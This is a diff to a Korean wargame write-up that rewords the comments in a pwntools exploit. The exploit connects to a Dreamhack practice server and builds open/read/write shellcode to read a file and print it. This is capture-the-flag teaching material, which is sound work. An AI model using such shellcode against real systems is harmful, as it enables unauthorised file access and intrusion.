@@ -85,7 +85,7 @@ sc = (void *)shellcode; 이다.
 # importing pwntools
 from pwn import* 
 
-# 원격서버를 대상으로 실제로 공격하므로 remote함수를 사용한다. 인자는 각각 호스트와 포트넘버이다.
+# 원격서버를 대상으로 실제로 공격하므로 remote함수를 사용한다. 매개변수는 각각 호스트와 포트넘버이다.
 p = remote('host1.dreamhack.games',10732) 
 
 #공격 대상 아키텍쳐는 x86-64
@@ -100,13 +100,13 @@ code = ''
 #shellcraft를 이용하여 open system call의 셸코드를 사용.
 code += shellcraft.open(path,0 ,0)
 
-#shellcraft를 이용하여 read system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
-#fd 인자로 rax를 쓰는 이유는 open syscall의 반환 값이 rax에 저장되기 때문이다.
-#주의해야할 점은 buffer 인자로 (rsp-count)가 아니라 rsp 값을 대입해야한다.
+#shellcraft를 이용하여 read system call의 셸코드를 사용. 매개변수는 fd,buffer,count 순이다. 
+#fd의 값으로 rax를 쓰는 이유는 open syscall의 반환 값이 rax에 저장되기 때문이다.
+#주의해야할 점은 buffer 값으로 (rsp-count)가 아니라 rsp 값을 대입해야한다.
 code += shellcraft.read('rax','rsp',0x1000)
 
-#shellcraft를 이용하여 write system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
-
+#shellcraft를 이용하여 write system call의 셸코드를 사용. 매개변수는 fd,buffer,count 순이다. 
+#fd 값으로 1(표준 출력), 나머지 인수는 read와 같음.
 code += shellcraft.write(1,'rsp',0x1000)
 
 #출력데이터 받아서 출력.
